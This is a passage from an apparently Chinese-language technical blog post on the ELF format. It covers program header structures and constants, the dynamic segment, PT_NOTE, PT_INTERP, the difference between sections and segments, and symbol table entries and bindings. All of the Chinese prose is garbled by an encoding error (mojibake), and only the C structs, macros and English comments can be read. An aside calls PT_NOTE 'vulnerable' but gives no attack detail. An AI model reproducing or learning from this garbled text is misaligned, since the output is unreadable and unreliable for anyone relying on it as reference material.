Header)&amp;æ®µ(Segment)æ‰§è¡Œæ—¶ELFè§†å›¾ï¼šå¯ä»¥çœ‹åˆ°ç¨‹åºå¤´çš„ä½ç½®,Segmenæ®µå’ŒSectionèŠ‚çš„æ˜ å°„å…³ç³» Whatâ€™s Program header? ELFç¨‹åºå¤´æ˜¯å¯¹äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ®µçš„æè¿°ï¼Œæ˜¯ç¨‹åºè£…è½½å¿…éœ€çš„ä¸€éƒ¨åˆ†ã€‚æ®µï¼ˆsegmentï¼‰æ˜¯åœ¨å†…æ ¸è£…è½½æ—¶è¢«è§£æçš„ï¼Œæè¿°äº†ç£ç›˜ä¸Šå¯æ‰§è¡Œæ–‡ä»¶çš„å†…å­˜å¸ƒå±€ä»¥åŠå¦‚ä½•æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚å¯ä»¥é€šè¿‡å¼•ç”¨åŸå§‹ELFå¤´ä¸­åä¸ºe_phoffï¼ˆç¨‹åºå¤´è¡¨åç§»é‡ï¼‰çš„åç§»é‡æ¥å¾—åˆ°ç¨‹åºå¤´è¡¨ï¼Œå¦‚å‰é¢ElfN_Ehdrç»“æ„ä¸­æ‰€ç¤ºã€‚ å¯æ‰§è¡Œæ–‡ä»¶æˆ–è€…å…±äº«ç›®æ ‡æ–‡ä»¶çš„ç¨‹åºå¤´éƒ¨æ˜¯ä¸€ä¸ªç»“æ„æ•°ç»„ï¼Œæ¯ä¸ªç»“æ„æè¿°äº†ä¸€ä¸ªæ®µæˆ–è€…ç³»ç»Ÿå‡†å¤‡ç¨‹åºæ‰§è¡Œæ‰€å¿…éœ€çš„å…¶å®ƒä¿¡æ¯ã€‚ç›®æ ‡æ–‡ä»¶çš„â€œæ®µâ€åŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ªâ€œèŠ‚åŒºâ€ï¼Œä¹Ÿå°±æ˜¯â€œæ®µå†…å®¹ï¼ˆSegment Contentsï¼‰â€ã€‚ç¨‹åºå¤´éƒ¨ä»…å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶æœ‰æ„ä¹‰ã€‚ ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ 1234567891011typedef struct&#123; Elf32_Word p_type; /* Segment type */ Elf32_Off p_offset; /* Segment file offset ç›¸å¯¹äºELFæ–‡ä»¶å¼€å¤´ */ Elf32_Addr p_vaddr; /* Segment virtual address */ Elf32_Addr p_paddr; /* Segment physical address */ Elf32_Word p_filesz; /* Segment size in file */ Elf32_Word p_memsz; /* Segment size in memory */ Elf32_Word p_flags; /* Segment flags */ Elf32_Word p_align; /* Segment alignmentå¯¹é½æ–¹å¼ */&#125; Elf32_Phdr; p_typeè¡¨ç¤ºsegmentçš„ç±»å‹ã€‚å®ƒçš„å¯èƒ½å€¼å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920#define PT_NULL 0 /* Program header table entry unused */#define PT_LOAD 1 /* Loadable program segment */#define PT_DYNAMIC 2 /* Dynamic linking information */#define PT_INTERP 3 /* Program interpreter */#define PT_NOTE 4 /* Auxiliary information */#define PT_SHLIB 5 /* Reserved */#define PT_PHDR 6 /* Entry for header table itself */#define PT_TLS 7 /* Thread-local storage segment */#define PT_NUM 8 /* Number of defined types */#define PT_LOOS 0x60000000 /* Start of OS-specific */#define PT_GNU_EH_FRAME 0x6474e550 /* GCC .eh_frame_hdr segment */#define PT_GNU_STACK 0x6474e551 /* Indicates stack executability */#define PT_GNU_RELRO 0x6474e552 /* Read-only after relocation */#define PT_LOSUNW 0x6ffffffa#define PT_SUNWBSS 0x6ffffffa /* Sun Specific segment */#define PT_SUNWSTACK 0x6ffffffb /* Stack segment */#define PT_HISUNW 0x6fffffff#define PT_HIOS 0x6fffffff /* End of OS-specific */#define PT_LOPROC 0x70000000 /* Start of processor-specific */#define PT_HIPROC 0x7fffffff /* End of processor-specific */ p_flagsè¡¨ç¤ºsegmentçš„æ ‡å¿—ã€‚å®ƒçš„å¯èƒ½å–å€¼å¦‚ä¸‹æ‰€ç¤ºï¼š 12345#define PF_X (1 &lt;&lt; 0) /* Segment is executable */#define PF_W (1 &lt;&lt; 1) /* Segment is writable */#define PF_R (1 &lt;&lt; 2) /* Segment is readable */#define PF_MASKOS 0x0ff00000 /* OS-specific */#define PF_MASKPROC 0xf0000000 /* Processor-specific */ ç¨‹åºå¤´å¯åˆ†ä¸ºä»¥ä¸‹å‡ ç§ ä¸‹é¢ä»‹ç»5ç§å¸¸è§çš„ç¨‹åºå¤´ç±»å‹ï¼š 1.PT_LOAD ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶è‡³å°‘æœ‰ä¸€ä¸ªPT_LOADç±»å‹çš„æ®µã€‚è¿™ç±»ç¨‹åºå¤´æè¿°çš„æ˜¯å¯è£…è½½çš„æ®µï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ç§ç±»å‹çš„æ®µå°†è¢«è£…è½½æˆ–è€…æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚ ä¾‹å¦‚ï¼Œä¸€ä¸ªéœ€è¦åŠ¨æ€é“¾æ¥çš„ELFå¯æ‰§è¡Œæ–‡ä»¶é€šå¸¸åŒ…å«ä»¥ä¸‹ä¸¤ä¸ªå¯è£…è½½çš„æ®µï¼ˆç±»å‹ä¸ºPT_LOADï¼‰ï¼š å­˜æ”¾ç¨‹åºä»£ç çš„textæ®µï¼› å­˜æ”¾å…¨å±€å˜é‡å’ŒåŠ¨æ€é“¾æ¥ä¿¡æ¯çš„dataæ®µã€‚ ä¸Šé¢çš„ä¸¤ä¸ªæ®µå°†ä¼šè¢«æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œå¹¶æ ¹æ®p_alignä¸­å­˜æ”¾çš„å€¼åœ¨å†…å­˜ä¸­å¯¹é½ã€‚Phdrç»“æ„ä½“ä¸­çš„å˜é‡æè¿°äº†æ®µåœ¨æ–‡ä»¶å’Œå†…å­˜çš„å¸ƒå±€ã€‚ 2.PT_DYNAMICâ€”â€”åŠ¨æ€æ®µçš„ Phdr åŠ¨æ€æ®µæ˜¯åŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶æ‰€ç‰¹æœ‰çš„ï¼ŒåŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨æ‰€å¿…éœ€çš„ä¸€äº›ä¿¡æ¯ã€‚åœ¨åŠ¨æ€æ®µä¸­åŒ…å«äº†ä¸€äº›æ ‡è®°å€¼å’ŒæŒ‡é’ˆï¼ŒåŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹å†…å®¹ï¼š è¿è¡Œæ—¶éœ€è¦é“¾æ¥çš„å…±äº«åº“åˆ—è¡¨ï¼› å…¨å±€åç§»è¡¨ï¼ˆGOTï¼‰çš„åœ°å€â€”â€”ELFåŠ¨æ€é“¾æ¥éƒ¨åˆ†ä¼šè®¨è®ºï¼› é‡å®šä½æ¡ç›®çš„ç›¸å…³ä¿¡æ¯ã€‚ ä¸‹é¢æ˜¯å®Œæ•´çš„æ ‡è®°ååˆ—è¡¨ æ ‡è®°å æ ‡è®°æè¿° DT_SYMTAB ç¬¦å·è¡¨åœ°å€ DT_RELA ç›¸å¯¹åœ°å€é‡å®šä½è¡¨çš„åœ°å€ DT_RELASZ Relaè¡¨çš„å­—èŠ‚å¤§å° DT_RELAENT Relaè¡¨æ¡ç›®çš„å­—èŠ‚å¤§å° DT_STRSZ å­—ç¬¦ä¸²è¡¨çš„å­—èŠ‚å¤§å° DT_SYMENT ç¬¦å·è¡¨æ¡ç›®çš„å­—èŠ‚å¤§å° DT_INIT åˆå§‹åŒ–å‡½æ•°çš„åœ°å€ DT_FINI ç»ˆæ­¢å‡½æ•°çš„åœ°å€ DT_SONAME å…±äº«ç›®æ ‡æ–‡ä»¶åçš„å­—ç¬¦ä¸²è¡¨åç§»é‡ DT_RPATH åº“æœç´¢è·¯å¾„çš„å­—ç¬¦ä¸²è¡¨åç§»é‡ DT_SYMBOLIC ä¿®æ”¹é“¾æ¥å™¨ï¼Œåœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¹‹å‰çš„å…±äº«ç›®æ ‡æ–‡ä»¶ä¸­æœç´¢ç¬¦å· DT_REL Rel relocsè¡¨çš„åœ°å€ DT_RELSZ Relè¡¨çš„å­—èŠ‚å¤§å° DT_RELENT Relè¡¨æ¡ç›®çš„å­—èŠ‚å¤§å° DT_PLTREL PLTå¼•ç”¨çš„relocç±»å‹ï¼ˆRelaæˆ–Relï¼‰ DT_DEBUG è¿˜æœªè¿›è¡Œå®šä¹‰ï¼Œä¸ºè°ƒè¯•ä¿ç•™ DT_TEXTREL ç¼ºå°‘æ­¤é¡¹è¡¨æ˜é‡å®šä½åªèƒ½åº”ç”¨äºå¯å†™æ®µ DT_JMPREL ä»…ç”¨äºPLTçš„é‡å®šä½æ¡ç›®åœ°å€ DT_BIND_NOW æŒ‡ç¤ºåŠ¨æ€é“¾æ¥å™¨åœ¨å°†æ§åˆ¶æƒäº¤ç»™å¯æ‰§è¡Œæ–‡ä»¶ä¹‹å‰å¤„ç†æ‰€æœ‰çš„é‡å®šä½ DT_RUNPATH åº“æœç´¢è·¯å¾„çš„å­—ç¬¦ä¸²è¡¨åç§»é‡ åŠ¨æ€æ®µåŒ…å«äº†ä¸€äº›ç»“æ„ä½“ï¼Œåœ¨è¿™äº›ç»“æ„ä½“ä¸­å­˜æ”¾ç€ä¸åŠ¨æ€é“¾æ¥ç›¸å…³çš„ä¿¡æ¯ã€‚d_tagæˆå‘˜å˜é‡æ§åˆ¶ç€d_unçš„å«ä¹‰ã€‚ ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š 12345678typedef struct&#123; Elf32_Sword d_tag; union&#123; Elf32_Word d_val; Elf32_Addr d_ptr; &#125;d_un; &#125; Elf32_Dyn; extern Elf32_Dyn _DYNAMIC[]; è¿™éƒ¨åˆ†å†…å®¹åœ¨åŠ¨æ€é“¾æ¥éƒ¨åˆ†æ·±å…¥è®¨è®º PT_NOTE PT_NOTEç±»å‹çš„æ®µå¯èƒ½ä¿å­˜äº†ä¸ç‰¹å®šä¾›åº”å•†æˆ–è€…ç³»ç»Ÿç›¸å…³çš„é™„åŠ ä¿¡æ¯ã€‚ä¸‹é¢æ˜¯æ ‡å‡†ELFè§„èŒƒä¸­å¯¹PT_NOTEçš„å®šä¹‰ï¼š æœ‰æ—¶ä¾›åº”å•†æˆ–è€…ç³»ç»Ÿæ„å»ºè€…éœ€è¦åœ¨ç›®æ ‡æ–‡ä»¶ä¸Šæ ‡è®°ç‰¹å®šçš„ä¿¡æ¯ï¼Œä»¥ä¾¿äºå…¶ä»–ç¨‹åºå¯¹ä¸€è‡´æ€§ã€å…¼å®¹æ€§ç­‰è¿›è¡Œæ£€æŸ¥ã€‚SHT_NOTEç±»å‹çš„èŠ‚ï¼ˆsectionï¼‰å’ŒPT_NOTEç±»å‹çš„ç¨‹åºå¤´å…ƒç´ å°±å¯ä»¥ç”¨äºè¿™ä¸€ç›®çš„ã€‚èŠ‚æˆ–è€…ç¨‹åºå¤´å…ƒç´ ä¸­çš„å¤‡æ³¨ä¿¡æ¯å¯ä»¥æœ‰ä»»æ„æ•°é‡çš„æ¡ç›®ï¼Œæ¯ä¸ªæ¡ç›®éƒ½æ˜¯ä¸€ä¸ª4å­—èŠ‚çš„ç›®æ ‡å¤„ç†å™¨æ ¼å¼çš„æ•°ç»„ã€‚ä¸‹é¢çš„æ ‡ç­¾å¯ä»¥è§£é‡Šå¤‡æ³¨ä¿¡æ¯çš„ç»„ç»‡ç»“æ„ï¼Œä¸è¿‡è¿™äº›æ ‡ç­¾å¹¶ä¸æ˜¯è§„èŒƒä¸­çš„å†…å®¹ã€‚ Tips:è¿™ä¸€æ®µå€¼ä¿å­˜äº†æ“ä½œç³»ç»Ÿçš„è§„èŒƒä¿¡æ¯ï¼Œå› ä¸ºç³»ç»Ÿä¼šå‡è®¾ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶å°±æ˜¯æœ¬åœ°è¿è¡Œçš„ï¼Œå¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ—¶æ˜¯ä¸éœ€è¦è¿™ä¸ªæ®µçš„ã€‚So this part is vulnerable.:) 4.PT_INTERP PT_INTERPæ®µåªå°†ä½ç½®å’Œå¤§å°ä¿¡æ¯å­˜æ”¾åœ¨ä¸€ä¸ªä»¥nullä¸ºç»ˆæ­¢ç¬¦çš„å­—ç¬¦ä¸²ä¸­ï¼Œæ˜¯å¯¹ç¨‹åºè§£é‡Šå™¨ä½ç½®çš„æè¿°ã€‚ä¾‹å¦‚ï¼Œ/lib/linux-ld.so.2ä¸€èˆ¬æ˜¯æŒ‡åŠ¨æ€é“¾æ¥å™¨çš„ä½ç½®ï¼Œä¹Ÿå³ç¨‹åºè§£é‡Šå™¨çš„ä½ç½®ã€‚ 5.PT_PHDR PT_PHDRæ®µä¿å­˜äº†ç¨‹åºå¤´è¡¨æœ¬èº«çš„ä½ç½®å’Œå¤§å°ã€‚Phdrè¡¨ä¿å­˜äº†æ‰€æœ‰çš„Phdrå¯¹æ–‡ä»¶ï¼ˆä»¥åŠå†…å­˜é•œåƒï¼‰ä¸­æ®µçš„æè¿°ä¿¡æ¯ã€‚ è‡³æ­¤æˆ‘ä»¬ä»¥åŠäº†è§£äº†èŠ‚Sectionå’Œæ®µSegment,ä¸‹é¢ç®€å•åšä¸ªå°ç»“æ¯”è¾ƒèŠ‚å’Œæ®µçš„ä¸åŒ æ®µæ˜¯ç¨‹åºæ‰§è¡Œçš„å¿…è¦ç»„æˆéƒ¨åˆ†ï¼Œåœ¨æ¯ä¸ªæ®µä¸­ï¼Œä¼šæœ‰ä»£ç æˆ–è€…æ•°æ®è¢«åˆ’åˆ†ä¸ºä¸åŒçš„èŠ‚ã€‚èŠ‚å¤´è¡¨æ˜¯å¯¹è¿™äº›èŠ‚çš„ä½ç½®å’Œå¤§å°çš„æè¿°ï¼Œä¸»è¦ç”¨äºé“¾æ¥å’Œè°ƒè¯•ã€‚èŠ‚å¤´å¯¹äºç¨‹åºçš„æ‰§è¡Œæ¥è¯´ä¸æ˜¯å¿…éœ€çš„ï¼Œæ²¡æœ‰èŠ‚å¤´è¡¨ï¼Œç¨‹åºä»å¯ä»¥æ­£å¸¸æ‰§è¡Œï¼Œå› ä¸ºèŠ‚å¤´è¡¨æ²¡æœ‰å¯¹ç¨‹åºçš„å†…å­˜å¸ƒå±€è¿›è¡Œæè¿°ï¼Œå¯¹ç¨‹åºå†…å­˜å¸ƒå±€çš„æè¿°æ˜¯ç¨‹åºå¤´è¡¨çš„ä»»åŠ¡ã€‚èŠ‚å¤´æ˜¯å¯¹ç¨‹åºå¤´çš„è¡¥å……ã€‚readelf â€“lå‘½ä»¤å¯ä»¥æ˜¾ç¤ºä¸€ä¸ªæ®µå¯¹åº”æœ‰å“ªäº›èŠ‚ï¼Œå¯ä»¥å¾ˆç›´è§‚åœ°çœ‹åˆ°èŠ‚å’Œæ®µä¹‹é—´çš„å…³ç³»ã€‚ å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶ä¸­ç¼ºå°‘èŠ‚å¤´ï¼Œå¹¶ä¸æ„å‘³ç€èŠ‚å°±ä¸å­˜åœ¨ã€‚åªæ˜¯æ²¡æœ‰åŠæ³•é€šè¿‡èŠ‚å¤´æ¥å¼•ç”¨èŠ‚ï¼Œå¯¹äºè°ƒè¯•å™¨æˆ–è€…åç¼–è¯‘ç¨‹åºæ¥è¯´ï¼Œåªæ˜¯å¯ä»¥å‚è€ƒçš„ä¿¡æ¯å˜å°‘äº†è€Œå·²ã€‚ sectionï¼šå‘Šè¯‰é“¾æ¥å™¨ä¸€ä¸ªéƒ¨åˆ†æ˜¯å¦ï¼š è¦åŠ è½½åˆ°å­˜å‚¨å™¨ä¸­çš„åŸå§‹æ•°æ®ï¼Œä¾‹å¦‚.dataï¼Œ.textç­‰. æˆ–å…¶ä»–éƒ¨åˆ†çš„æ ¼å¼åŒ–å…ƒæ•°æ®ï¼Œå°†ç”±é“¾æ¥å™¨ä½¿ç”¨ï¼Œä½†åœ¨è¿è¡Œæ—¶æ¶ˆå¤±ï¼Œä¾‹å¦‚.symtabï¼Œ.srttabï¼Œ.rela.text segmentï¼šå‘Šè¯‰æ“ä½œç³»ç»Ÿï¼š åº”å°†æ®µåŠ è½½åˆ°è™šæ‹Ÿå†…å­˜ä¸­çš„å“ªä¸ªä½ç½® æ®µå…·æœ‰å“ªäº›æƒé™ï¼ˆè¯»å–ï¼Œå†™å…¥ï¼Œæ‰§è¡Œï¼‰ ä¸‹é¢ç”¨ä¸€å¼ å›¾æ¥åšä¸ªæ€»ç»“ï¼Œç›´è§‚åœ°ç†è§£ELF_Headerã€Sectionã€Segmentã€Phdrã€Shdrä¹‹é—´çš„æ˜ å°„å…³ç³» åœ¨äº†è§£äº†ELF_Headerã€Sectionã€Segmentã€Program_Headerè€ŒåŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å†æ¥ä»‹ç»ELFç¬¦å· ELFç¬¦å·&amp;é‡å®šä½ç¬¦å· ç¬¦å·æ˜¯å¯¹æŸäº›ç±»å‹çš„æ•°æ®æˆ–è€…ä»£ç ï¼ˆå¦‚å…¨å±€å˜é‡æˆ–å‡½æ•°ï¼‰çš„ç¬¦å·å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œprintf()å‡½æ•°ä¼šåœ¨åŠ¨æ€ç¬¦å·è¡¨.dynsymä¸­å­˜æœ‰ä¸€ä¸ªæŒ‡å‘è¯¥å‡½æ•°çš„ç¬¦å·æ¡ç›®ã€‚åœ¨å¤§å¤šæ•°å…±äº«åº“å’ŒåŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œå­˜åœ¨ä¸¤ä¸ªç¬¦å·è¡¨ã€‚å¦‚å‰é¢ä½¿ç”¨readelf â€“Så‘½ä»¤è¾“å‡ºçš„å†…å®¹ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªèŠ‚ï¼š.dynsymå’Œ.symtabã€‚ .dynsymä¿å­˜äº†å¼•ç”¨æ¥è‡ªå¤–éƒ¨æ–‡ä»¶ç¬¦å·çš„å…¨å±€ç¬¦å·ï¼Œå¦‚printfè¿™æ ·çš„åº“å‡½æ•°ï¼Œ.dynsymä¿å­˜çš„ç¬¦å·æ˜¯.symtabæ‰€ä¿å­˜ç¬¦å·çš„å­é›†ï¼Œ.symtabä¸­è¿˜ä¿å­˜äº†å¯æ‰§è¡Œæ–‡ä»¶çš„æœ¬åœ°ç¬¦å·ï¼Œå¦‚å…¨å±€å˜é‡ï¼Œæˆ–è€…ä»£ç ä¸­å®šä¹‰çš„æœ¬åœ°å‡½æ•°ç­‰ã€‚å› æ­¤ï¼Œ.symtabä¿å­˜äº†æ‰€æœ‰çš„ç¬¦å·ï¼Œè€Œ.dynsymåªä¿å­˜åŠ¨æ€/å…¨å±€ç¬¦å·ã€‚ æ—¢ç„¶.symtabä¸­ä¿å­˜äº†.dynsymä¸­æ‰€æœ‰çš„ç¬¦å·ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜éœ€è¦ä¸¤ä¸ªç¬¦å·è¡¨å‘¢ï¼Ÿä½¿ç”¨readelf â€“Så‘½ä»¤æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶çš„è¾“å‡ºï¼Œå¯ä»¥çœ‹åˆ°ä¸€éƒ¨åˆ†èŠ‚è¢«æ ‡è®°ä¸ºäº†Aï¼ˆALLOCï¼‰ã€WAï¼ˆWRITE/ALLOCï¼‰æˆ–è€…AXï¼ˆALLOC/EXECï¼‰ã€‚.dynsymæ˜¯è¢«æ ‡è®°äº†ALLOCçš„ï¼Œè€Œ.symtabåˆ™æ²¡æœ‰æ ‡è®°ã€‚ ALLOCè¡¨ç¤ºæœ‰è¯¥æ ‡è®°çš„èŠ‚ä¼šåœ¨è¿è¡Œæ—¶åˆ†é…å¹¶è£…è½½è¿›å…¥å†…å­˜ï¼Œè€Œ.symtabä¸æ˜¯åœ¨è¿è¡Œæ—¶å¿…éœ€çš„ï¼Œå› æ­¤ä¸ä¼šè¢«è£…è½½åˆ°å†…å­˜ä¸­ã€‚.dynsymä¿å­˜çš„ç¬¦å·åªèƒ½åœ¨è¿è¡Œæ—¶è¢«è§£æï¼Œå› æ­¤æ˜¯è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥å™¨æ‰€éœ€è¦çš„å”¯ä¸€ç¬¦å·ã€‚.dynsymç¬¦å·è¡¨å¯¹äºåŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶çš„æ‰§è¡Œæ¥è¯´æ˜¯å¿…éœ€çš„ï¼Œè€Œ.symtabç¬¦å·è¡¨åªæ˜¯ç”¨æ¥è¿›è¡Œè°ƒè¯•å’Œé“¾æ¥çš„ï¼Œæœ‰æ—¶å€™ä¸ºäº†èŠ‚çœç©ºé—´ï¼Œä¼šå°†.symtabç¬¦å·è¡¨ä»ç”Ÿäº§äºŒè¿›åˆ¶æ–‡ä»¶ä¸­åˆ æ‰ã€‚ ä¸‹é¢ä»‹ç»ELFæ–‡ä»¶ç¬¦å·é¡¹ç»“æ„(32ä½ä¸ºä¾‹): 123456789typedef struct&#123; Elf32_Word st_name; /* Symbol name (string tbl index) */ Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf32_Section st_shndx; /* Section index */&#125; Elf32_Sym; å­—æ®µ è¯´æ˜ st_name åŒ…å«ç›®æ ‡æ–‡ä»¶ç¬¦å·å­—ç¬¦ä¸²è¡¨çš„ç´¢å¼•ï¼Œå…¶ä¸­åŒ…å«ç¬¦å·åçš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚å¦‚æœè¯¥å€¼é 0ï¼Œåˆ™å®ƒè¡¨ç¤ºäº†ç»™å‡ºç¬¦å·åçš„å­—ç¬¦ä¸²è¡¨ç´¢å¼•ï¼Œå¦åˆ™ç¬¦å·è¡¨é¡¹æ²¡æœ‰åç§°ã€‚æ³¨ï¼šå¤–éƒ¨ C ç¬¦å·åœ¨ C è¯­è¨€å’Œç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­å…·æœ‰ç›¸åŒçš„åç§°ã€‚ st_value æ­¤æˆå‘˜ç»™å‡ºç›¸å…³è”çš„ç¬¦å·çš„å–å€¼ã€‚ä¾èµ–äºå…·ä½“çš„ä¸Šä¸‹æ–‡ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªç»å¯¹å€¼ã€ä¸€ä¸ªåœ°å€ç­‰ç­‰ã€‚ st_size å¾ˆå¤šç¬¦å·å…·æœ‰ç›¸å…³çš„å°ºå¯¸å¤§å°ã€‚ä¾‹å¦‚ä¸€ä¸ªæ•°æ®å¯¹è±¡çš„å¤§å°æ˜¯å¯¹è±¡ä¸­åŒ…å«çš„å­—èŠ‚æ•°ã€‚å¦‚æœç¬¦å·æ²¡æœ‰å¤§å°æˆ–è€…å¤§å°æœªçŸ¥ï¼Œåˆ™æ­¤æˆå‘˜ä¸º 0ã€‚ st_info æ­¤æˆå‘˜ç»™å‡ºç¬¦å·çš„ç±»å‹å’Œç»‘å®šå±æ€§ã€‚ä¸‹é¢ç»™å‡ºè‹¥å¹²å–å€¼å’Œå«ä¹‰çš„ç»‘å®šå…³ç³»ã€‚ st_other è¯¥æˆå‘˜å½“å‰åŒ…å« 0ï¼Œå…¶å«ä¹‰æ²¡æœ‰å®šä¹‰ã€‚ st_shndx æ¯ä¸ªç¬¦å·è¡¨é¡¹éƒ½ä»¥å’Œå…¶ä»–èŠ‚åŒºé—´çš„å…³ç³»çš„æ–¹å¼ç»™å‡ºå®šä¹‰ã€‚æ­¤æˆå‘˜ç»™å‡ºç›¸å…³çš„èŠ‚åŒºå¤´éƒ¨è¡¨ç´¢å¼•ã€‚æŸäº›ç´¢å¼•å…·æœ‰ç‰¹æ®Šå«ä¹‰ å…³äºst_infoçš„è¯¦ç»†è¯´æ˜ï¼š t_infoæŒ‡å®šç¬¦å·ç±»å‹åŠç»‘å®šå±æ€§ã€‚æ“çºµæ–¹å¼å¦‚ä¸‹ï¼š 123#define ELF32_ST_BIND(i) ((i)&gt;&gt;4)#define ELF32_ST_TYPE(i) ((i)&amp;0xf) #define ELF32_ST_INFO(b, t) (((b)&lt;&lt;4) + ((t)&amp;0xf)) st_infoçš„ä½å››ä½è¡¨ç¤ºç¬¦å·ç»‘å®š å¯ä»¥æŸ¥é˜…ELFæ‰‹å†Œæ¥æŸ¥çœ‹å®Œæ•´çš„ç±»å‹ä»¥å±æ€§åˆ—è¡¨ã€‚ç¬¦å·ç±»å‹ä»¥STTå¼€å¤´ï¼Œç¬¦å·ç»‘å®šä»¥STBå¼€å¤´ï¼Œä¸‹é¢å¯¹å‡ ç§å¸¸è§çš„ç¬¦å·ç±»å‹å’Œç¬¦å·ç»‘å®šè¿›è¡Œä»‹ç»ã€‚ 1ï¼ç¬¦å·ç±»å‹ ä¸‹é¢æ˜¯å‡ ç§ç¬¦å·ç±»å‹ã€‚ STT_NOTYPEï¼šç¬¦å·ç±»å‹æœªå®šä¹‰ã€‚ STT_FUNCï¼šè¡¨ç¤ºè¯¥ç¬¦å·ä¸å‡½æ•°æˆ–è€…å…¶ä»–å¯æ‰§è¡Œä»£ç å…³è”ã€‚ STT_OBJECTï¼šè¡¨ç¤ºè¯¥ç¬¦å·ä¸æ•°æ®ç›®æ ‡æ–‡ä»¶å…³è” 2.ç¬¦å·ç»‘å®š:ç”¨äºç¡®å®šé“¾æ¥å¯è§æ€§å’Œè¡Œä¸º åç§° å–å€¼ è¯´æ˜ STB_LOCAL 0 å±€éƒ¨ç¬¦å·åœ¨åŒ…å«è¯¥ç¬¦å·å®šä¹‰çš„ç›®æ ‡æ–‡ä»¶ä»¥å¤–ä¸å¯è§ã€‚ç›¸åŒåç§°çš„å±€éƒ¨ç¬¦å·å¯ä»¥å­˜åœ¨äºå¤šä¸ªæ–‡ä»¶ä¸­ï¼Œäº’ä¸å½±å“ã€‚ STB_GLOBAL 1 å…¨å±€ç¬¦å·å¯¹æ‰€æœ‰å°†ç»„åˆçš„ç›®æ ‡æ–‡ä»¶éƒ½æ˜¯å¯è§çš„ã€‚ä¸€ä¸ªæ–‡ä»¶ä¸­å¯¹æŸä¸ªå…¨å±€ç¬¦å·çš„å®šä¹‰å°†æ»¡è¶³å¦ä¸€ä¸ªæ–‡ä»¶å¯¹ç›¸åŒå…¨å±€ç¬¦å·çš„æœªå®šä¹‰å¼•ç”¨ã€‚ STB_WEAK 2 å¼±ç¬¦å·ä¸å…¨å±€ç¬¦å·ç±»ä¼¼ï¼Œä¸è¿‡ä»–ä»¬çš„å®šä¹‰ä¼˜å…ˆçº§æ¯”è¾ƒä½ã€‚ STB_LOPROC 13 å¤„äºè¿™ä¸ªèŒƒå›´çš„å–å€¼æ˜¯ä¿ç•™ç»™å¤„ç†å™¨ä¸“ç”¨è¯­ä¹‰çš„ã€‚ STB_HIPROC 15 å¤„äºè¿™ä¸ªèŒƒå›´çš„å–å€¼æ˜¯ä¿ç•™ç»™å¤„ç†å™¨ä¸“ç”¨è¯­ä¹‰çš„ã€‚ å…¨å±€ç¬¦å·ä¸å¼±ç¬¦å·ä¹‹é—´çš„åŒºåˆ«ä¸»è¦æœ‰ä¸¤ç‚¹ï¼š (1).å½“é“¾æ¥ç¼–è¾‘å™¨ç»„åˆè‹¥å¹²å¯é‡å®šä½çš„ç›®æ ‡æ–‡ä»¶æ—¶ï¼Œä¸å…è®¸å¯¹åŒåçš„STB_GLOBAL ç¬¦å·ç»™å‡ºå¤šä¸ªå®šä¹‰ã€‚ å¦ä¸€æ–¹é¢å¦‚æœä¸€ä¸ªå·²å®šä¹‰çš„å…¨å±€ç¬¦å·å·²ç»å­˜åœ¨ï¼Œå‡ºç°ä¸€ä¸ªåŒåçš„å¼±ç¬¦å·å¹¶ä¸ä¼šäº§ç”Ÿé”™è¯¯ã€‚é“¾æ¥ç¼–è¾‘å™¨å°½å…³å¿ƒå…¨å±€ç¬¦å·ï¼Œå¿½ç•¥å¼±ç¬¦å·ã€‚ ç±»ä¼¼åœ°ï¼Œå¦‚æœä¸€ä¸ªå…¬å…±ç¬¦å·ï¼ˆç¬¦å·çš„ st_shndx ä¸­åŒ…å« SHN_COMMONï¼‰ï¼Œé‚£ä¹ˆå…·æœ‰ç›¸åŒåç§°çš„å¼±ç¬¦å·å‡ºç°ä¹Ÿä¸ä¼šå¯¼è‡´é”™è¯¯ã€‚é“¾æ¥ç¼–è¾‘å™¨ä¼šé‡‡çº³å…¬å…±å®šä¹‰ï¼Œè€Œå¿½ç•¥å¼±å®šä¹‰ã€‚ (2).å½“é“¾æ¥ç¼–è¾‘å™¨æœç´¢å½’æ¡£åº“ï¼ˆarchive librariesï¼‰æ—¶ï¼Œä¼šæå–é‚£äº›åŒ…å«æœªå®šä¹‰å…¨å±€ç¬¦å·çš„æ¡£æ¡ˆæˆå‘˜ã€‚æˆå‘˜çš„å®šä¹‰å¯ä»¥æ˜¯å…¨å±€ç¬¦å·ï¼Œä¹Ÿå¯ä»¥æ˜¯å¼±ç¬¦å·ã€‚è¿æ¥ç¼–è¾‘å™¨ä¸ä¼šæå–æ¡£æ¡ˆæˆå‘˜æ¥æ»¡è¶³æœªå®šä¹‰çš„å¼±ç¬¦å·ã€‚ 